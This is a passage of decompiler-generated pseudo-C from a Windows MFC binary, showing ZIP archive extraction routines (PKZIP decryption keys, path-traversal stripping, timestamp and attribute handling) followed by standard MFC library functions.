      *(byte *)(_Memory + 0x1b) = *(byte *)(in_EAX + 0xc) & 1;
      if (((uint)in_EAX[0xc] >> 3 & 1) == 0) {
        *(undefined *)((int)_Memory + 0x7d) = *(undefined *)((int)in_EAX + 0x3f);
      }
      else {
        *(undefined *)((int)_Memory + 0x7d) = *(undefined *)((int)in_EAX + 0x39);
      }
      puVar3 = (uint *)((int)_Memory + 0x6d);
      *(uint *)((int)_Memory + 0x79) = -(uint)(*(char *)(_Memory + 0x1b) != '\0') & 0xc;
      *puVar3 = 0x12345678;
      *(undefined4 *)((int)_Memory + 0x71) = 0x23456789;
      *(undefined4 *)((int)_Memory + 0x75) = 0x34567890;
      if (param_1 != (char *)0x0) {
        do {
          if (*param_1 == '\0') break;
          FUN_004080e0(*param_1,puVar3);
          param_1 = param_1 + 1;
          puVar3 = extraout_EDX;
        } while (param_1 != (char *)0x0);
      }
      _Memory[0xf] = local_4 + (int)in_EAX[0x1e] + 0x1e;
      _Memory[2] = (void *)0x0;
      in_EAX[0x1f] = _Memory;
      return 0;
    }
    _free(_Memory);
  }
  return 0xffffff98;
}



int __thiscall FUN_004096a0(void *this,void *param_1,undefined *param_2)

{
  int *piVar1;
  char cVar2;
  void **ppvVar3;
  char *pcVar4;
  byte *pbVar5;
  undefined uVar6;
  int in_EAX;
  uint uVar7;
  void *pvVar8;
  void *pvVar9;
  int iVar10;
  int extraout_ECX;
  void *pvVar11;
  int local_c;
  int local_8;
  
  local_8 = 0;
  local_c = 0;
  if (param_2 != (undefined *)0x0) {
    *param_2 = 0;
  }
  if ((in_EAX == 0) || (ppvVar3 = *(void ***)(in_EAX + 0x7c), ppvVar3 == (void **)0x0)) {
    return -0x66;
  }
  if (*ppvVar3 == (void *)0x0) {
    return -100;
  }
  if (this != (void *)0x0) {
    ppvVar3[4] = param_1;
    ppvVar3[5] = this;
    if (ppvVar3[0x17] < this) {
      ppvVar3[5] = ppvVar3[0x17];
    }
    if (ppvVar3[5] != (void *)0x0) {
      do {
        if ((ppvVar3[2] == (void *)0x0) && (pvVar9 = ppvVar3[0x16], pvVar9 != (void *)0x0)) {
          pvVar8 = (void *)0x4000;
          if ((pvVar9 < (void *)0x4000) && (pvVar8 = pvVar9, pvVar9 == (void *)0x0)) {
            if (param_2 == (undefined *)0x0) {
              return 0;
            }
            *param_2 = 1;
            return 0;
          }
          pcVar4 = (char *)ppvVar3[0x18];
          iVar10 = (int)ppvVar3[0x1a] + (int)ppvVar3[0xf];
          if (*pcVar4 == '\0') {
            *(int *)(pcVar4 + 0x14) = iVar10;
          }
          else {
            if (pcVar4[1] == '\0') {
              return -1;
            }
            SetFilePointer(*(HANDLE *)(pcVar4 + 2),*(int *)(pcVar4 + 7) + iVar10,(PLONG)0x0,0);
            iVar10 = extraout_ECX;
          }
          uVar7 = FUN_00408840(iVar10,*ppvVar3,1);
          if (uVar7 != 1) {
            return -1;
          }
          pvVar9 = *ppvVar3;
          ppvVar3[0xf] = (void *)((int)ppvVar3[0xf] + (int)pvVar8);
          ppvVar3[0x16] = (void *)((int)ppvVar3[0x16] - (int)pvVar8);
          ppvVar3[1] = pvVar9;
          ppvVar3[2] = pvVar8;
          if ((*(char *)(ppvVar3 + 0x1b) != '\0') && (pvVar11 = (void *)0x0, pvVar8 != (void *)0x0))
          {
            do {
              uVar6 = FUN_00408130();
              *(undefined *)((int)pvVar11 + (int)pvVar9) = uVar6;
              pvVar11 = (void *)((int)pvVar11 + 1);
            } while (pvVar11 < pvVar8);
          }
        }
        pvVar9 = ppvVar3[2];
        pvVar8 = *(void **)((int)ppvVar3 + 0x79);
        if (pvVar9 < *(void **)((int)ppvVar3 + 0x79)) {
          pvVar8 = pvVar9;
        }
        if (pvVar8 != (void *)0x0) {
          cVar2 = *(char *)((int)(void *)((int)ppvVar3[1] + (int)pvVar8) + -1);
          ppvVar3[0x17] = (void *)((int)ppvVar3[0x17] - (int)pvVar8);
          piVar1 = (int *)((int)ppvVar3 + 0x79);
          *piVar1 = *piVar1 - (int)pvVar8;
          ppvVar3[2] = (void *)((int)pvVar9 - (int)pvVar8);
          ppvVar3[1] = (void *)((int)ppvVar3[1] + (int)pvVar8);
          if ((*piVar1 == 0) && (cVar2 != *(char *)((int)ppvVar3 + 0x7d))) {
            return -0x6a;
          }
        }
        if (ppvVar3[0x19] == (void *)0x0) {
          pvVar9 = ppvVar3[2];
          if (ppvVar3[5] < ppvVar3[2]) {
            pvVar9 = ppvVar3[5];
          }
          pvVar8 = (void *)0x0;
          if (pvVar9 != (void *)0x0) {
            do {
              *(undefined *)((int)pvVar8 + (int)ppvVar3[4]) =
                   *(undefined *)((int)pvVar8 + (int)ppvVar3[1]);
              pvVar8 = (void *)((int)pvVar8 + 1);
            } while (pvVar8 < pvVar9);
          }
          pbVar5 = (byte *)ppvVar3[4];
          pvVar8 = (void *)FUN_00407fd0(pbVar5,(uint)pvVar9);
          ppvVar3[0x17] = (void *)((int)ppvVar3[0x17] - (int)pvVar9);
          ppvVar3[2] = (void *)((int)ppvVar3[2] - (int)pvVar9);
          ppvVar3[5] = (void *)((int)ppvVar3[5] - (int)pvVar9);
          ppvVar3[1] = (void *)((int)ppvVar3[1] + (int)pvVar9);
          ppvVar3[6] = (void *)((int)ppvVar3[6] + (int)pvVar9);
          local_c = local_c + (int)pvVar9;
          ppvVar3[0x14] = pvVar8;
          ppvVar3[4] = pbVar5 + (int)pvVar9;
          if ((ppvVar3[0x17] == (void *)0x0) && (param_2 != (undefined *)0x0)) {
            *param_2 = 1;
          }
        }
        else {
          pbVar5 = (byte *)ppvVar3[4];
          pvVar9 = ppvVar3[6];
          local_8 = FUN_004084a0();
          uVar7 = (int)ppvVar3[6] - (int)pvVar9;
          pvVar9 = (void *)FUN_00407fd0(pbVar5,uVar7);
          ppvVar3[0x17] = (void *)((int)ppvVar3[0x17] - uVar7);
          local_c = local_c + uVar7;
          ppvVar3[0x14] = pvVar9;
          if ((local_8 == 1) || (ppvVar3[0x17] == (void *)0x0)) {
            if (param_2 == (undefined *)0x0) {
              return local_c;
            }
            *param_2 = 1;
            return local_c;
          }
          if (local_8 != 0) {
            return local_8;
          }
        }
      } while (ppvVar3[5] != (void *)0x0);
      if (local_8 != 0) {
        return local_8;
      }
    }
    return local_c;
  }
  return 0;
}



undefined4 FUN_00409910(void)

{
  void **_Memory;
  undefined4 uVar1;
  int unaff_EDI;
  
  uVar1 = 0;
  if (unaff_EDI == 0) {
    return 0xffffff9a;
  }
  _Memory = *(void ***)(unaff_EDI + 0x7c);
  if (_Memory == (void **)0x0) {
    return 0xffffff9a;
  }
  if ((_Memory[0x17] == (void *)0x0) && (_Memory[0x14] != _Memory[0x15])) {
    uVar1 = 0xffffff97;
  }
  if (*_Memory != (void *)0x0) {
    _free(*_Memory);
    *_Memory = (void *)0x0;
  }
  *_Memory = (void *)0x0;
  if (_Memory[0x10] != (void *)0x0) {
    FUN_004083a0();
  }
  _Memory[0x10] = (void *)0x0;
  _free(_Memory);
  *(undefined4 *)(unaff_EDI + 0x7c) = 0;
  return uVar1;
}



_FILETIME __fastcall FUN_00409990(uint param_1)

{
  uint in_EAX;
  _FILETIME local_1c;
  SYSTEMTIME local_14;
  
  local_14.wYear = ((ushort)param_1 >> 9) + 0x7bc;
  local_14.wMonth = (ushort)(param_1 >> 5) & 0xf;
  local_14.wDay = (ushort)param_1 & 0x1f;
  local_14.wHour = (ushort)in_EAX >> 0xb;
  local_14.wMinute = (ushort)(in_EAX >> 5) & 0x3f;
  local_14.wSecond = ((ushort)in_EAX & 0x1f) * 2;
  local_14.wMilliseconds = 0;
  SystemTimeToFileTime(&local_14,&local_1c);
  return local_1c;
}



void FUN_00409a10(void)

{
  char cVar1;
  char *pcVar2;
  char *pcVar3;
  undefined4 *unaff_ESI;
  
  unaff_ESI[1] = 0xffffffff;
  unaff_ESI[0x8e] = 0xffffffff;
  *unaff_ESI = 0;
  unaff_ESI[0x8f] = 0;
  unaff_ESI[0x90] = 0;
  pcVar2 = "1234";
  do {
    pcVar3 = pcVar2;
    pcVar2 = pcVar3 + 1;
  } while (*pcVar3 != '\0');
  pcVar2 = (char *)FUN_0040a3f1((uint)(pcVar3 + -0x42c97b));
  unaff_ESI[0x8f] = pcVar2;
  pcVar3 = "1234";
  do {
    cVar1 = *pcVar3;
    *pcVar2 = cVar1;
    pcVar3 = pcVar3 + 1;
    pcVar2 = pcVar2 + 1;
  } while (cVar1 != '\0');
  return;
}



int FUN_00409a70(undefined4 param_1,undefined4 param_2)

{
  short *psVar1;
  WCHAR WVar2;
  short sVar3;
  int **lpBuffer;
  undefined *puVar4;
  int *piVar5;
  int **unaff_ESI;
  undefined4 *puVar6;
  
  if ((*unaff_ESI == (int *)0x0) && (unaff_ESI[1] == (int *)0xffffffff)) {
    lpBuffer = unaff_ESI + 0x91;
    GetCurrentDirectoryW(0x104,(LPWSTR)lpBuffer);
    do {
      WVar2 = *(WCHAR *)lpBuffer;
      lpBuffer = (int **)((int)lpBuffer + 2);
    } while (WVar2 != L'\0');
    sVar3 = *(short *)((int)unaff_ESI + ((int)lpBuffer - ((int)unaff_ESI + 0x246) >> 1) * 2 + 0x242)
    ;
    if ((sVar3 != 0x5c) && (sVar3 != 0x2f)) {
      puVar6 = (undefined4 *)((int)unaff_ESI + 0x242);
      do {
        psVar1 = (short *)((int)puVar6 + 2);
        puVar6 = (undefined4 *)((int)puVar6 + 2);
      } while (*psVar1 != 0);
      *puVar6 = 0x5c;
    }
    puVar4 = (undefined *)operator_new(0x18);
    *puVar4 = 0;
    puVar4[1] = 1;
    puVar4[0xb] = 0;
    *(undefined4 *)(puVar4 + 0xc) = param_1;
    *(undefined4 *)(puVar4 + 0x10) = param_2;
    *(undefined4 *)(puVar4 + 0x14) = 0;
    *(undefined4 *)(puVar4 + 7) = 0;
    piVar5 = FUN_00408b80();
    *unaff_ESI = piVar5;
    return (-(uint)(piVar5 != (int *)0x0) & 0xfffffe00) + 0x200;
  }
  return 0x1000000;
}



void __thiscall FUN_00409b30(void *this,int param_1,int *param_2)

{
  wchar_t wVar1;
  char *pcVar2;
  int3 iVar3;
  _FILETIME _Var4;
  byte bVar5;
  int iVar6;
  char *pcVar7;
  wchar_t *pwVar8;
  undefined4 *puVar9;
  uint uVar10;
  byte bVar11;
  int iVar12;
  undefined4 extraout_ECX;
  byte *pbVar13;
  byte bVar14;
  byte bVar15;
  int *piVar16;
  wchar_t *_Str;
  bool bVar17;
  longlong lVar18;
  undefined auStack_394 [5];
  byte bStack_38f;
  undefined uStack_38e;
  undefined uStack_38d;
  undefined4 local_38c;
  char *local_388;
  int *local_384;
  _FILETIME _Stack_380;
  _FILETIME _Stack_378;
  char *local_370;
  uint local_36c [4];
  uint uStack_35c;
  int iStack_354;
  int iStack_350;
  uint uStack_338;
  CHAR local_31c [264];
  WCHAR aWStack_214 [262];
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)auStack_394;
  local_384 = (int *)this;
                    // WARNING: Load size is inaccurate
  if ((param_1 < -1) || (*(int *)(*this + 4) <= param_1)) goto LAB_0040a0ca;
  if (*(int *)((int)this + 4) != -1) {
    FUN_00409910();
  }
  _Var4.dwHighDateTime = _Stack_378.dwHighDateTime;
  _Var4.dwLowDateTime = _Stack_378.dwLowDateTime;
  *(undefined4 *)((int)this + 4) = 0xffffffff;
  if (param_1 == *(int *)((int)this + 0x238)) {
    if (param_1 != -1) {
      piVar16 = (int *)((int)this + 8);
      for (iVar12 = 0x8c; iVar12 != 0; iVar12 = iVar12 + -1) {
        *param_2 = *piVar16;
        piVar16 = piVar16 + 1;
        param_2 = param_2 + 1;
      }
      goto LAB_0040a0ca;
    }
  }
  else if (param_1 != -1) {
                    // WARNING: Load size is inaccurate
    if (param_1 < *(int *)(*this + 0x10)) {
      FUN_00409260();
    }
                    // WARNING: Load size is inaccurate
    iVar12 = *(int *)(*this + 0x10);
    while (iVar12 < param_1) {
                    // WARNING: Load size is inaccurate
      iVar12 = *this;
      if (((iVar12 != 0) && (*(int *)(iVar12 + 0x18) != 0)) &&
         (iVar6 = *(int *)(iVar12 + 0x10) + 1, iVar6 != *(int *)(iVar12 + 4))) {
        *(int *)(iVar12 + 0x14) =
             *(int *)(iVar12 + 0x14) +
             *(int *)(iVar12 + 0x50) + *(int *)(iVar12 + 0x4c) + 0x2e + *(int *)(iVar12 + 0x48);
        *(int *)(iVar12 + 0x10) = iVar6;
        iVar6 = FUN_00408e10((int *)(iVar12 + 0x28),(uint *)(iVar12 + 0x78),(void *)0x0,0);
        *(uint *)(iVar12 + 0x18) = (uint)(iVar6 == 0);
      }
                    // WARNING: Load size is inaccurate
      iVar12 = *(int *)(*this + 0x10);
    }
    FUN_00408e10((int *)local_36c,(uint *)0x0,local_31c,0x104);
    iVar12 = FUN_004092a0(&local_370,&local_388,(char **)&local_38c);
    if (iVar12 != 0) goto LAB_0040a0ca;
                    // WARNING: Load size is inaccurate
    pcVar2 = **this;
    if (*pcVar2 == '\0') {
      *(char **)(pcVar2 + 0x14) = local_388;
LAB_00409cd4:
      pcVar2 = local_38c;
      local_388 = (char *)FUN_0040a3f1((uint)local_38c);
      pcVar7 = (char *)FUN_00408840(extraout_ECX,local_388,(uint)pcVar2);
      if (pcVar7 == pcVar2) {
        *param_2 = *(int *)(*local_384 + 0x10);
        MultiByteToWideChar(0xfde9,0,local_31c,-1,aWStack_214,0x104);
        _Str = aWStack_214;
        while( true ) {
          while( true ) {
            while( true ) {
              while( true ) {
                while( true ) {
                  while( true ) {
                    for (; (wVar1 = *_Str, wVar1 != L'\0' && (_Str[1] == L':')); _Str = _Str + 2) {
                    }
                    if (wVar1 != L'\\') break;
                    _Str = _Str + 1;
                  }
                  if (wVar1 != L'/') break;
                  _Str = _Str + 1;
                }
                pwVar8 = _wcsstr(_Str,L"\\..\\");
                if (pwVar8 == (wchar_t *)0x0) break;
                _Str = pwVar8 + 4;
              }
              pwVar8 = _wcsstr(_Str,L"\\../");
              if (pwVar8 == (wchar_t *)0x0) break;
              _Str = pwVar8 + 4;
            }
            pwVar8 = _wcsstr(_Str,L"/../");
            if (pwVar8 == (wchar_t *)0x0) break;
            _Str = pwVar8 + 4;
          }
          pwVar8 = _wcsstr(_Str,L"/..\\");
          if (pwVar8 == (wchar_t *)0x0) break;
          _Str = pwVar8 + 4;
        }
        iVar12 = 4 - (int)_Str;
        do {
          wVar1 = *_Str;
          *(wchar_t *)((int)param_2 + iVar12 + (int)_Str) = wVar1;
          _Str = _Str + 1;
        } while (wVar1 != L'\0');
        bVar14 = ~(byte)(uStack_338 >> 0x17);
        local_36c[0] = local_36c[0] >> 8;
        bVar11 = (byte)(uStack_338 >> 0x1e);
        uStack_38d = 0;
        bStack_38f = 0;
        uStack_38e = 1;
        if (((local_36c[0] == 0) || (local_36c[0] == 7)) ||
           ((local_36c[0] == 0xb || (local_36c[0] == 0xe)))) {
          bStack_38f = (byte)(uStack_338 >> 2) & 1;
          bVar14 = (byte)uStack_338;
          bVar15 = (byte)(uStack_338 >> 1) & 1;
          bVar11 = (byte)(uStack_338 >> 4);
          bVar5 = (byte)(uStack_338 >> 5) & 1;
        }
        else {
          bVar15 = 0;
          bVar5 = 1;
        }
        iVar12 = 0;
        param_2[0x83] = 0;
        if ((bVar11 & 1) != 0) {
          param_2[0x83] = 0x10;
        }
        if (bVar5 != 0) {
          param_2[0x83] = param_2[0x83] | 0x20;
        }
        if (bVar15 != 0) {
          param_2[0x83] = param_2[0x83] | 2;
        }
        if ((bVar14 & 1) != 0) {
          param_2[0x83] = param_2[0x83] | 1;
        }
        if (bStack_38f != 0) {
          param_2[0x83] = param_2[0x83] | 4;
        }
        param_2[0x8a] = iStack_354;
        param_2[0x8b] = iStack_350;
        _Stack_378 = FUN_00409990(uStack_35c >> 0x10);
        LocalFileTimeToFileTime(&_Stack_378,&_Stack_380);
        pcVar7 = local_388;
        pcVar2 = local_38c;
        param_2[0x84] = _Stack_380.dwLowDateTime;
        param_2[0x85] = _Stack_380.dwHighDateTime;
        param_2[0x86] = _Stack_380.dwLowDateTime;
        param_2[0x87] = _Stack_380.dwHighDateTime;
        param_2[0x88] = _Stack_380.dwLowDateTime;
        param_2[0x89] = _Stack_380.dwHighDateTime;
        if ((char *)0x4 < local_38c) {
          local_38c = (char *)((uint)local_38c & 0xff000000);
          do {
            local_38c = (char *)CONCAT31(CONCAT21(local_38c._2_2_,local_388[iVar12 + 1]),
                                         local_388[iVar12]);
            pbVar13 = &DAT_0042e450;
            puVar9 = &local_38c;
            do {
              bVar14 = *(byte *)puVar9;
              bVar17 = bVar14 < *pbVar13;
              if (bVar14 != *pbVar13) {
LAB_00409f60:
                iVar6 = (1 - (uint)bVar17) - (uint)(bVar17 != 0);
                goto LAB_00409f65;
              }
              if (bVar14 == 0) break;
              bVar14 = *(byte *)((int)puVar9 + 1);
              bVar17 = bVar14 < pbVar13[1];
              if (bVar14 != pbVar13[1]) goto LAB_00409f60;
              puVar9 = (undefined4 *)((int)puVar9 + 2);
              pbVar13 = pbVar13 + 2;
            } while (bVar14 != 0);
            iVar6 = 0;
LAB_00409f65:
            if (iVar6 == 0) {
              bVar14 = local_388[iVar12 + 4];
              bStack_38f = bVar14 >> 2 & 1;
              iVar6 = iVar12 + 5;
              if ((bVar14 & 1) != 0) {
                iVar3 = CONCAT21(CONCAT11(local_388[iVar12 + 8],local_388[iVar12 + 7]),
                                 local_388[iVar12 + 6]);
                uVar10 = CONCAT31(iVar3,local_388[iVar6]);
                iVar6 = iVar12 + 9;
                lVar18 = __allmul(uVar10 + 0xb6109100,
                                  ((int)iVar3 >> 0x17) + 2 + (uint)(0x49ef6eff < uVar10),10000000,0)
                ;
                *(longlong *)(param_2 + 0x88) = lVar18;
              }
              if ((bVar14 >> 1 & 1) != 0) {
                iVar3 = CONCAT21(CONCAT11(pcVar7[iVar6 + 3],pcVar7[iVar6 + 2]),pcVar7[iVar6 + 1]);
                uVar10 = CONCAT31(iVar3,pcVar7[iVar6]);
                iVar6 = iVar6 + 4;
                lVar18 = __allmul(uVar10 + 0xb6109100,
                                  ((int)iVar3 >> 0x17) + 2 + (uint)(0x49ef6eff < uVar10),10000000,0)
                ;
                *(longlong *)(param_2 + 0x84) = lVar18;
              }
              if (bStack_38f != 0) {
                iVar3 = CONCAT21(CONCAT11(pcVar7[iVar6 + 3],pcVar7[iVar6 + 2]),pcVar7[iVar6 + 1]);
                uVar10 = CONCAT31(iVar3,pcVar7[iVar6]);
                lVar18 = __allmul(uVar10 + 0xb6109100,
                                  ((int)iVar3 >> 0x17) + 2 + (uint)(0x49ef6eff < uVar10),10000000,0)
                ;
                *(longlong *)(param_2 + 0x86) = lVar18;
              }
              break;
            }
            iVar12 = iVar12 + 4 + (uint)(byte)local_388[iVar12 + 2];
          } while ((char *)(iVar12 + 4U) < pcVar2);
        }
        if (pcVar7 != (char *)0x0) {
          FUN_0040a3fc(pcVar7);
        }
        piVar16 = local_384 + 2;
        for (iVar12 = 0x8c; iVar12 != 0; iVar12 = iVar12 + -1) {
          *piVar16 = *param_2;
          param_2 = param_2 + 1;
          piVar16 = piVar16 + 1;
        }
        local_384[0x8e] = param_1;
        goto LAB_0040a0ca;
      }
      FUN_0040a3fc(local_388);
    }
    else if (pcVar2[1] != '\0') {
      SetFilePointer(*(HANDLE *)(pcVar2 + 2),(LONG)(local_388 + *(int *)(pcVar2 + 7)),(PLONG)0x0,0);
      goto LAB_00409cd4;
    }
    goto LAB_0040a0ca;
  }
                    // WARNING: Load size is inaccurate
  *param_2 = *(int *)(*this + 4);
  *(undefined2 *)(param_2 + 1) = 0;
  param_2[0x83] = 0;
  param_2[0x84] = 0;
  param_2[0x85] = 0;
  param_2[0x86] = 0;
  param_2[0x87] = 0;
  param_2[0x88] = 0;
  param_2[0x89] = 0;
  param_2[0x8a] = 0;
  param_2[0x8b] = 0;
  _Stack_378 = _Var4;
LAB_0040a0ca:
  ___security_check_cookie_4(local_8 ^ (uint)auStack_394);
  return;
}



void FUN_0040a0f0(void *param_1,void *param_2)

{
  int iVar1;
  int iVar2;
  int *unaff_EBX;
  undefined auStack_8 [3];
  char local_5;
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)auStack_8;
  if (unaff_EBX[1] != 0) {
    if (unaff_EBX[1] != -1) {
      FUN_00409910();
    }
    unaff_EBX[1] = -1;
    if (*(int *)(*unaff_EBX + 4) < 1) {
      ___security_check_cookie_4(local_4 ^ (uint)auStack_8);
      return;
    }
    if (0 < *(int *)(*unaff_EBX + 0x10)) {
      FUN_00409260();
    }
    iVar2 = *(int *)(*unaff_EBX + 0x10);
    while (iVar2 < 0) {
      iVar2 = *unaff_EBX;
      if (((iVar2 != 0) && (*(int *)(iVar2 + 0x18) != 0)) &&
         (iVar1 = *(int *)(iVar2 + 0x10) + 1, iVar1 != *(int *)(iVar2 + 4))) {
        *(int *)(iVar2 + 0x14) =
             *(int *)(iVar2 + 0x14) +
             *(int *)(iVar2 + 0x50) + *(int *)(iVar2 + 0x4c) + 0x2e + *(int *)(iVar2 + 0x48);
        *(int *)(iVar2 + 0x10) = iVar1;
        iVar1 = FUN_00408e10((int *)(iVar2 + 0x28),(uint *)(iVar2 + 0x78),(void *)0x0,0);
        *(uint *)(iVar2 + 0x18) = (uint)(iVar1 == 0);
      }
      iVar2 = *(int *)(*unaff_EBX + 0x10);
    }
    FUN_00409530((char *)unaff_EBX[0x8f]);
    unaff_EBX[1] = 0;
  }
  iVar2 = FUN_004096a0(param_2,param_1,&local_5);
  if (iVar2 < 1) {
    FUN_00409910();
    unaff_EBX[1] = -1;
  }
  if (local_5 == '\0') {
    if (iVar2 < 1) {
      ___security_check_cookie_4(local_4 ^ (uint)auStack_8);
      return;
    }
    ___security_check_cookie_4(local_4 ^ (uint)auStack_8);
    return;
  }
  ___security_check_cookie_4(local_4 ^ (uint)auStack_8);
  return;
}



void FUN_0040a250(void)

{
  void **_Memory;
  void *pvVar1;
  void **unaff_ESI;
  
  if (unaff_ESI[1] != (void *)0xffffffff) {
    FUN_00409910();
  }
  _Memory = (void **)*unaff_ESI;
  unaff_ESI[1] = (void *)0xffffffff;
  if (_Memory != (void **)0x0) {
    if (_Memory[0x1f] != (void *)0x0) {
      FUN_00409910();
    }
    pvVar1 = *_Memory;
    if (pvVar1 != (void *)0x0) {
      if (*(char *)((int)pvVar1 + 0xb) != '\0') {
        CloseHandle(*(HANDLE *)((int)pvVar1 + 2));
      }
      FUN_0040a3fc(pvVar1);
    }
    _free(_Memory);
  }
  *unaff_ESI = (void *)0x0;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 * __cdecl FUN_0040a2b0(undefined4 param_1,undefined4 param_2)

{
  void *pvVar1;
  int iVar2;
  undefined4 *puVar3;
  void *local_c;
  undefined *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_004286cb;
  local_c = ExceptionList;
  ExceptionList = &local_c;
  pvVar1 = operator_new(0x44c);
  local_4 = 0;
  if (pvVar1 == (void *)0x0) {
    iVar2 = 0;
  }
  else {
    iVar2 = FUN_00409a10();
  }
  local_4 = 0xffffffff;
  _DAT_00437d40 = FUN_00409a70(param_1,param_2);
  if (_DAT_00437d40 != 0) {
    if (iVar2 != 0) {
      FUN_0040a360();
    }
    ExceptionList = local_c;
    return (undefined4 *)0x0;
  }
  puVar3 = (undefined4 *)operator_new(8);
  *puVar3 = 1;
  puVar3[1] = iVar2;
  ExceptionList = local_c;
  return puVar3;
}



void FUN_0040a360(void)

{
  void *unaff_ESI;
  
  if (*(void **)((int)unaff_ESI + 0x23c) != (void *)0x0) {
    FUN_0040a3fc(*(void **)((int)unaff_ESI + 0x23c));
  }
  *(undefined4 *)((int)unaff_ESI + 0x23c) = 0;
  if (*(void **)((int)unaff_ESI + 0x240) != (void *)0x0) {
    FUN_0040a3fc(*(void **)((int)unaff_ESI + 0x240));
  }
  *(undefined4 *)((int)unaff_ESI + 0x240) = 0;
  FUN_0040a3fc(unaff_ESI);
  return;
}



void thunk_FUN_0040a59b(void)

{
  FUN_0040a59b();
  return;
}



// Library Function - Single Match
//  int (__cdecl*__stdcall AfxSetNewHandler(int (__cdecl*)(unsigned int)))(unsigned int)
// 
// Library: Visual Studio 2008 Release

_func_int_uint * AfxSetNewHandler(_func_int_uint *param_1)

{
  _func_int_uint *p_Var1;
  
  p_Var1 = (_func_int_uint *)PTR_thunk_FUN_0040a59b_00432000;
  PTR_thunk_FUN_0040a59b_00432000 = param_1;
  return p_Var1;
}



// Library Function - Single Match
//  void * __cdecl operator new(unsigned int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

void * __cdecl operator_new(uint param_1)

{
  int iVar1;
  void *pvVar2;
  
  while( true ) {
    pvVar2 = _malloc(param_1);
    if (pvVar2 != (void *)0x0) {
      return pvVar2;
    }
    if (PTR_thunk_FUN_0040a59b_00432000 == (undefined *)0x0) break;
    iVar1 = (*(code *)PTR_thunk_FUN_0040a59b_00432000)(param_1);
    if (iVar1 == 0) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



void __cdecl FUN_0040a3f1(uint param_1)

{
  operator_new(param_1);
  return;
}



void FUN_0040a3fc(void *param_1)

{
  _free(param_1);
  return;
}



undefined ** FUN_0040a407(void)

{
  return &PTR_s_CObject_0042950c;
}



// WARNING: Function: __EH_prolog3_catch replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: class CObject * __thiscall CRuntimeClass::CreateObject(void)
// 
// Library: Visual Studio 2008 Release

CObject * __thiscall CRuntimeClass::CreateObject(CRuntimeClass *this)

{
  CObject *pCVar1;
  CRuntimeClass *extraout_ECX;
  int iVar2;
  int extraout_EDX;
  
  iVar2 = 0;
  if (this == (CRuntimeClass *)0x0) {
    AfxThrowNotSupportedException();
    this = extraout_ECX;
    iVar2 = extraout_EDX;
  }
  if (*(int *)(this + 0xc) == iVar2) {
    pCVar1 = (CObject *)0x0;
  }
  else {
    pCVar1 = (CObject *)(**(code **)(this + 0xc))();
  }
  return pCVar1;
}



undefined4 Catch_0040a449(void)

{
  int unaff_EBP;
  
  FUN_0040a4cb(*(int **)(unaff_EBP + -0x18));
  return 0x40a440;
}



// Library Function - Single Match
//  public: int __thiscall CRuntimeClass::IsDerivedFrom(struct CRuntimeClass const *)const 
// 
// Library: Visual Studio 2008 Release

int __thiscall CRuntimeClass::IsDerivedFrom(CRuntimeClass *this,CRuntimeClass *param_1)

{
  if (this != (CRuntimeClass *)0x0) goto LAB_0040a467;
  do {
    AfxThrowNotSupportedException();
LAB_0040a467:
  } while (param_1 == (CRuntimeClass *)0x0);
  do {
    if (this == param_1) {
      return 1;
    }
    this = *(CRuntimeClass **)(this + 0x10);
  } while (this != (CRuntimeClass *)0x0);
  return 0;
}



// Library Function - Single Match
//  public: int __thiscall CObject::IsKindOf(struct CRuntimeClass const *)const 
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __thiscall CObject::IsKindOf(CObject *this,CRuntimeClass *param_1)

{
  CRuntimeClass *this_00;
  int iVar1;
  undefined4 *extraout_ECX;
  
  if (this != (CObject *)0x0) goto LAB_0040a490;
  do {
    AfxThrowNotSupportedException();
    this = (CObject *)extraout_ECX;
LAB_0040a490:
    this_00 = (CRuntimeClass *)(***(code ***)this)();
  } while (this_00 == (CRuntimeClass *)0x0);
  iVar1 = CRuntimeClass::IsDerivedFrom(this_00,param_1);
  return iVar1;
}



// Library Function - Single Match
//  void __stdcall AfxClassInit(struct CRuntimeClass *)
// 
// Library: Visual Studio 2008 Release

void AfxClassInit(CRuntimeClass *param_1)

{
  AFX_MODULE_STATE *pAVar1;
  
  pAVar1 = AfxGetModuleState();
  AfxLockGlobals(0);
  CSimpleList::AddHead((CSimpleList *)(pAVar1 + 0x1c),param_1);
  AfxUnlockGlobals(0);
  return;
}



void __fastcall FUN_0040a4cb(int *param_1)

{
  if (0 < param_1[1]) {
    (**(code **)(*param_1 + 4))(1);
  }
  return;
}



void __fastcall FUN_0040a4d9(int *param_1)

{
                    // WARNING: Could not recover jumptable at 0x0040a4e1. Too many branches
                    // WARNING: Treating indirect jump as call
  (**(code **)(*param_1 + 0x10))();
  return;
}



// Library Function - Single Match
//  public: virtual int __thiscall CException::ReportError(unsigned int,unsigned int)
// 
// Library: Visual Studio 2008 Release

int __thiscall CException::ReportError(CException *this,uint param_1,uint param_2)

{
  int iVar1;
  uint local_40c;
  wchar_t local_408 [512];
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  iVar1 = (**(code **)(*(int *)this + 0xc))(local_408,0x200,&local_40c);
  if (iVar1 == 0) {
    if (param_2 == 0) {
      param_2 = 0xf020;
    }
    AfxMessageBox(param_2,param_1,local_40c);
  }
  else {
    AfxMessageBox(local_408,param_1,local_40c);
  }
  iVar1 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar1;
}



undefined ** FUN_0040a558(void)

{
  return &PTR_s_CSimpleException_004295a8;
}



undefined ** FUN_0040a55e(void)

{
  return &PTR_s_CMemoryException_004295c4;
}



undefined ** FUN_0040a564(void)

{
  return &PTR_s_CNotSupportedException_004295e0;
}



undefined ** FUN_0040a56a(void)

{
  return &PTR_s_CInvalidArgException_004295fc;
}



// Library Function - Single Match
//  public: void __thiscall CSimpleException::InitString(void)
// 
// Library: Visual Studio 2008 Release

void __thiscall CSimpleException::InitString(CSimpleException *this)

{
  int iVar1;
  
  *(undefined4 *)(this + 0xc) = 1;
